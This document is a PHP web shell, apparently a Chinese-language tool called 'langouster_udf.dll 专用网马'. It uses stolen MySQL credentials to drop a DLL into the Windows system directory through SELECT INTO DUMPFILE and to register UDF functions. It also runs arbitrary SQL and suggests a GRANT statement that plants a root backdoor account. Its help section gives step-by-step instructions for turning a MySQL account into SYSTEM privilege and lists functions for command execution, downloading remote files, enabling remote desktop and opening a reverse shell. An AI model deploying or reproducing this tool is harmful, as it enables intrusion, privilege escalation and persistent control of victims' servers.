<?php
error_reporting(7);
ob_start();
session_start();
function shellini(){
    return get_file_contents($_FILES['upfile']['tmp_name']);
}
?>
<html>
	<head>
		<title>langouster_udf.dll 专用网马</title>
	</head>
	<body>
<?php

if(!empty($_GET['action']) && $_GET['action']=='help')
	mysql_help();


//-----------------------------------------------------------------------------------起始输入
if(empty($_GET['action']))
{

?>
	<form action="?action=connect" method=POST>
		<table>
		<tr><td>host:</td><td><input type="text" name="host" size="30"></td></tr>
		<tr><td>mysql账号:</td><td><input type="text" name="username" size="30"></td></tr>
		<tr><td>密码:</td><td><input type="text" name="password" size="30"></td></tr>
		<tr><td>数据库名:</td><td><input type="text" name="dbname" size="30"></td></tr>
		<tr><td>&nbsp;</td><td><input type="submit" name="submit" value="提交">&nbsp;&nbsp;&nbsp;<input type="reset" name="reset" value="重填"></td></tr>
	</form>
<?php
	exit;
}

if(!empty($_GET['action']))//连接mysql
{
	if(!empty($_POST['host']))
		$_SESSION['host']=$_POST['host'];
	if(!empty($_POST['username']))
		$_SESSION['username']=$_POST['username'];
	if(!empty($_POST['password']))
		$_SESSION['password']=$_POST['password'];
	if(!empty($_POST['dbname']))
		$_SESSION['dbname']=$_POST['dbname'];
		
	$dbconn=@mysql_connect($_SESSION['host'],$_SESSION['username'],$_SESSION['password']);
	if(!$dbconn)
	{
		$_SESSION['host']=$_SESSION['username']=$_SESSION['password']=$_SESSION['dbname']='';
		die('数据库连结失败，请检查账号信息。'. mysql_error().' &nbsp;<a href="javascript:history.back()">返回重填</a>' );
	}
	else
		echo 'MYSQL连结成功<br><br>';
	//选择数据库
	@mysql_select_db($_SESSION['dbname']);
	$err = mysql_error(); 
	if($err) 
	{
		echo '切换数据库出错，请检查数据库'.$_SESSION['dbname'].'是否存在。'.$err.'&nbsp;<a href="javascript:history.back()">返回重填</a>'; 
		$_SESSION['dbname']='';
		mysql_close($dbconn);
		exit;
	}
}
//-----------------------------------------------------------------------------------------导出DLL
if(!empty($_POST['dllpath']) )
	$path=stripslashes($_POST['dllpath']);
if($path=='')
	$path=$_SESSION['dllpath'];
if($path=='')
	$path="C:\\Winnt\\udf.dll";

echo '<form action="?action=buildDLL&" method=POST>';
echo ' 16进制文件:<br><textarea name="upfile" style="width: 880px; height: 150px"></textarea><br>';
echo	'导出路径：<input type="text" name="dllpath" size="40" value="'. $path.'">&nbsp;&nbsp;<input type="submit" name="submit" value="导出到此目录">';
echo '</form>';

if ( !function_exists( 'hex2bin' ) ) {
    function hex2bin( $str ) {
        $sbin = "";
        $len = strlen( $str );
        for ( $i = 0; $i < $len; $i += 2 ) {
            $sbin .= pack( "H*", substr( $str, $i, 2 ) );
        }

        return $sbin;
    }
}

if(!empty($_GET['action'])&&$_GET['action']=='buildDLL')
{
	$_SESSION['dllpath']=$path;
	if(strpos($_SESSION['dllpath'],'.')==false)
		if(strrpos($_SESSION['dllpath'],'\\')==false || strrpos($_SESSION['dllpath'],'\\')!=strlen($_SESSION['dllpath'])-1)
			$_SESSION['dllpath']= $_SESSION['dllpath'].'\\udf.dll';
		else
			$_SESSION['dllpath']=$_SESSION['dllpath'].'udf.dll';
	
    $shellcode = $_POST['upfile'];

    //file_put_contents($path, hex2bin($shellcode));
    
    $temp=str_replace("\\\\","\\",$_SESSION['dllpath']);
    $temp=str_replace("\\","\\\\",$temp);
    $query="SELECT CONVERT($shellcode, CHAR) INTO DUMPFILE '".$temp."';" ;
    //echo $query;
    if(!mysql_query($query, $dbconn))
        echo '导出DLL文件出错：'.mysql_error();
    else
    {
        echo 'DLL已成功的导出到'.$_SESSION['dllpath'].'<br>';
    }
    //mysql_query('DROP TABLE Temp_Tab;', $dbconn);
    $query='';
}
echo '<hr><br>';
//-----------------------------------------------------------------------------------------执行SQL语句
if(!empty($_POST['query']))
	$query=stripslashes($_POST['query']);

echo '<form action="?action=SQL&" method=POST>';
echo <<<EOF
<pre>
Create Function cmdshell returns string soname dllname
drop function if exists `cmdshell`;

添加root权限后门帐户
GRANT ALL PRIVILEGES ON *.* TO 用户名@"%" identified by "密码"
</pre>
EOF;
echo 'SQL命令:<br><input type="text" name="query" size="60" value="'. $query .'">&nbsp;&nbsp;&nbsp;<input type="submit" value="执行">';
echo '</form>';

$query=str_replace("\\\\","\\",$query);
$query=str_replace("\\","\\\\",$query);
if($query!='' && $_GET['action']=='SQL')
{
	
	$result = mysql_query($query, $dbconn); 
	$err = mysql_error(); 
	if($err) 
	{
		echo '数据库查讯出错，请检查SQL语句'.$query.'的语法是否正确。'.mysql_error();
	}
	else
	{
		echo '回显结果:<br>';
		echo '<pre>';
		
		if(strtolower(substr($query,0,6))=='select')//检验是不是查讯语句
		{
			for($i=0;$i<mysql_num_fields($result);$i++)
				echo mysql_field_name($result,$i)."\t";
			echo "\r\n\r\n";
			
			while($row = mysql_fetch_array($result))
			{
				for($i=0;$i<mysql_num_fields($result);$i++)
				{
					echo htmlspecialchars($row[$i])."\t";
				}
					
				echo "\r\n";
			}
		}
        else
        {
			for($i=0;$i<mysql_num_fields($result);$i++)
				echo mysql_field_name($result,$i)."\t";
			echo "\r\n\r\n";
			while($row = mysql_fetch_array($result))
			{
				for($i=0;$i<mysql_num_fields($result);$i++)
				{
					echo htmlspecialchars($row[$i])."\t";
				}
					
				echo "\r\n";
			}
			echo "   执行成功\r\n";
        }
			
		echo '-----------------------------------';
		echo '</pre>';
	}
}
mysql_close($dbconn);
//-----------------------------------------------------------------------------------------底部信息

?>

<br><br><hr>
<center>
	<font color="#886688" size="3">&copy;Langouster</font>
	<a href="?action=help" target="_blank"><font color="#FF0000">help</font></a>&nbsp;
	<a href="mailto:langouster@163.com">feedback</a>
</center>
	
</body>
</html>
<?php 
function mysql_help()
{
?>
	<br>
	
	一、功能：<font color="#558866" size="3">利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。</font><br><br>
	
	二、适用场合：<font color="#558866" size="3">1.目标系统是Windows(Win2000,XP,Win2003)；2.你已经拥有MYSQL的某个用户账号，此账号必须有对mysql的insert和delete权限以创建和抛弃函数(MYSQL文档原语)。</font><br><br>
	
	三、使用帮助：<br>
	<font color="#558866" size="3">
	&nbsp;&nbsp;&nbsp;第一步：将本文件上传到目标机上，填入你的MYSQL账号经行连接。<br><br>
	&nbsp;&nbsp;&nbsp;第二步：连接成功后，导出DLL文件，导出时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），对于MYSQL5.0以上版本，你必须将DLL导出到目标机器的系统目录(win 或 system32)，否则在下一步操作中你会看到"No paths allowed for shared library"错误。<br><br>
	&nbsp;&nbsp;&nbsp;第三步：使用SQL语句创建功能函数。语法：Create Function 函数名（函数名只能为下面列表中的其中之一） returns string soname '导出的DLL路径'；对于MYSQL5.0以上版本，语句中的DLL不允许带全路径，如果你在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则你将会看到"Can't open shared library"错误，这时你必须将DLL重新导出到系统目录。   <br><br>
	&nbsp;&nbsp;&nbsp;第四步：正确创建功能函数后，你就可以用SQL语句来使用这些功能了。语法：select 创建的函数名('参数列表')； 每个函数有不同的参数，你可以使用select 创建的函数名('help')；来获得指定函数的参数列表信息。<br><br>
	&nbsp;&nbsp;&nbsp;第五步：使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function  创建的函数名；<br><br>
	</font>
	四、功能函数说明：<br>
	<font color="#558866" size="3">
	&nbsp;&nbsp;&nbsp;cmdshell 执行cmd;<br>
	&nbsp;&nbsp;&nbsp;downloader 下载者,到网上下载指定文件并保存到指定目录;<br>
	&nbsp;&nbsp;&nbsp;open3389 通用开3389终端服务,可指定端口(不改端口无需重启);<br>
	&nbsp;&nbsp;&nbsp;backshell 反弹Shell;<br>
	&nbsp;&nbsp;&nbsp;ProcessView 枚举系统进程;<br>
	&nbsp;&nbsp;&nbsp;KillProcess  终止指定进程;<br>
	&nbsp;&nbsp;&nbsp;regread 读注册表;<br>
	&nbsp;&nbsp;&nbsp;regwrite 写注册表;<br>
	&nbsp;&nbsp;&nbsp;shut 关机,注销,重启;<br>
	&nbsp;&nbsp;&nbsp;about 说明与帮助函数;<br>
	</font>
	
<?php 	
	exit;
}

?>
